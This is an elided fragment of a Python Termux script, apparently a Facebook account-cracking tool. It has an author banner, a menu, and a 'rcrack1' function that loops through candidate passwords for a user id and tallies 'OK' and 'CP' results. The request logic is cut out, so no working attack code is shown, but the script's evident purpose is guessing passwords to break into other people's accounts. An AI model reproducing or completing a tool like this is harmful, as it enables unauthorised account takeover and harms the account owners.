...
\033[1;94m       [+]===============================================[+]
\033[1;94m       [+]        CREATED BY   :  RABBY SHEIKH          \033[1;94m[+]
\033[1;94m       [+]        ON GITHUB    :  RABBY-909             \033[1;94m[+]
\033[1;94m       [+]        TEAM         :  RABBY TERMUX ZONR     \033[1;94m[+]
...
class Main:
    def __init__(self):
        ...
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://facebook.com/rabbi.nai1')
        if Alif in [" 0", "00"]:
            exit()
        else:
            exit()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mRABBY SHEKH\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
